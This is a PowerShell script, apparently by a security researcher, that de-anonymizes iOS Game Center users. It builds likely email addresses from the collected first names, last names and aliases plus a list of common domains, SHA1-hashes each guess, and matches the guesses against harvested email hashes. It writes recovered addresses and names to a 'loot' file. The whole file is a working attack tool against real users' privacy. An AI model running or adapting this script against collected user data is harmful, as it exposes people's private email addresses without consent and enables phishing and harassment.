#######################################################
#	EmailGenerator.ps1
#		Karl Fosaaen
#		Twitter: @kfosaaen
#	
#	Reads in a list of email domains (topEmailDomains.txt)
#	and data collected iOS from Game Center (parseable.txt).
#	
#	parseable.txt Format:
#	 G:IDNUMBER:EMAILHASH:ALIAS:LAST_NAME:FIRST_NAME
#
#	Then generates potential email addresses
#		Hashes them and compares them to hashes collected from gamecenter
#

Get-Content .\topEmailDomains.txt | Foreach-Object {
	$domain=$_
	Write-Host "Domain"$domain"`n"
	Get-Content .\parseable.txt | Foreach-Object {

		$alias=$_.Split(“:”)[3]
		$Last=$_.Split(“:”)[4]
		$First=$_.Split(“:”)[5]
	
		#Variation Creation Section
		#Karl.Fosaaen
		$firstDOTlastDOTemail=$First+"."+$Last+"@"+$domain
		#K.fosaaen
		$firstinitialDOTlastDOTemail=$First[0]+"."+$Last+"@"+$domain
		#kfosaaen
		$firstinitialLastDOTemail=$First[0]+$Last+"@"+$domain
		#karlfosaaen
		$firstLastDOTemail=$First+$Last+"@"+$domain
		#karl.f
		$firstDOTlastinintialDOTemail=$First+"."+$Last[0]+"@"+$domain
		#karlf
		$firstlastinintialDOTemail=$First+$Last[0]+"@"+$domain
		#Alias
		$aliasDOTemail=$alias+"@"+$domain
		
		#Write Variations to File - This was done to save the list for plugging into HashCat
		$firstDOTlastDOTemail | out-file -encoding ASCII -append .\emails.txt
		$firstinitialDOTlastDOTemail | out-file -encoding ASCII -append .\emails.txt
		$firstinitialLastDOTemail | out-file -encoding ASCII -append .\emails.txt
		$firstLastDOTemail | out-file -encoding ASCII -append .\emails.txt
		$firstDOTlastinintialDOTemail | out-file -encoding ASCII -append .\emails.txt
		$firstlastinintialDOTemail | out-file -encoding ASCII -append .\emails.txt
		$aliasDOTemail | out-file -encoding ASCII -append .\emails.txt
		
		
		Get-Content .\emails.txt | Foreach-Object {
			
			$res=""
		
			$hasher = new-object System.Security.Cryptography.SHA1Managed
			$toHash = [System.Text.Encoding]::UTF8.GetBytes($_)
			$hashByteArray = $hasher.ComputeHash($toHash)
			foreach($byte in $hashByteArray)
			{
				$res += "{0:X2}" -f $byte
			}
	
			$email=$_
			
			#Compare hash to collected hashes
			Get-Content .\parseable.txt | Foreach-Object {
				$GID=$_.Split(“:”)[1]
				$Hash=$_.Split(“:”)[2].ToUpper()
				$alias=$_.Split(“:”)[3]
				$Last=$_.Split(“:”)[4]
				$First=$_.Split(“:”)[5]
		
				if ($Hash -eq $res){
					#Echo out found email addresses to the screen
					Write-Host "Found"$Hash"`nEmail:"$email"`nName:"$First" "$Last"`nAlias:"$alias"`n"
					$toWrite="G:"+$GID+":"+$Hash+":"+$email+":"+$First+":"+$Last+"`:"+$alias+""
					$toWrite | out-file -encoding ASCII -append .\loot.txt
				}
			}
		}
		# Deletes temp email list
		Invoke-Expression "del emails.txt"
	}
}